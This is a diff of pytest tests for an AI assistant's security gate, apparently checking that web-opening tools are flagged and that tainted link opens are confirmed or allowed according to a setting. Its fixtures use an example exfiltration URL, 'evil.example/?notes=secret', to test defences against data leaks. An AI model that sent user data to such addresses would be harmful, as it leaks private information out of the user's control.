@@ -196,3 +196,32 @@ async def test_commands_run_without_a_shell_or_secrets(monkeypatch: pytest.Monke
 async def test_commands_time_out() -> None:
     with pytest.raises(TimeoutError):
         await run_command([sys.executable, "-c", "import time; time.sleep(5)"], timeout_s=0.1)
+
+
+def test_only_the_tools_that_open_a_web_address_say_so() -> None:
+    """Their addresses are seen in the browser: ``security.confirm_links`` covers them."""
+    from yarvis.tools.browser import BrowserOpen  # noqa: PLC0415
+    from yarvis.tools.computer import OpenWebsite  # noqa: PLC0415
+    from yarvis.tools.mcp import McpTool  # noqa: PLC0415
+    from yarvis.tools.windows import WindowsOpenWebsite  # noqa: PLC0415
+
+    assert OpenWebsite.opens_links
+    assert WindowsOpenWebsite.opens_links
+    assert BrowserOpen.opens_links
+    assert not McpTool.opens_links  # a server could send it anywhere
+
+
+@pytest.mark.parametrize(("confirm_links", "expected"), [(True, "confirm"), (False, "allow")])
+def test_the_real_link_tools_follow_the_link_setting(confirm_links: bool, expected: str) -> None:
+    from yarvis.security.gate import Gate  # noqa: PLC0415
+    from yarvis.tools.browser import BrowserOpen, Browsers, OpenArgs  # noqa: PLC0415
+
+    gate = Gate(confirm_external=False, confirm_links=confirm_links)
+    website = OpenWebsite(FakeRunner())
+    url = UrlArgs(url="https://evil.example/?notes=secret")
+    tab = BrowserOpen(FakeRunner(), Browsers(FakeRunner(), Apps(()), "Safari"))
+    tab_args = OpenArgs(url="https://evil.example/?notes=secret")
+    sends = website.sends_data_out(url)
+    assert gate.check(website, tainted=True, sends_out=sends).verdict.value == expected
+    sends = tab.sends_data_out(tab_args)
+    assert gate.check(tab, tainted=True, sends_out=sends).verdict.value == expected
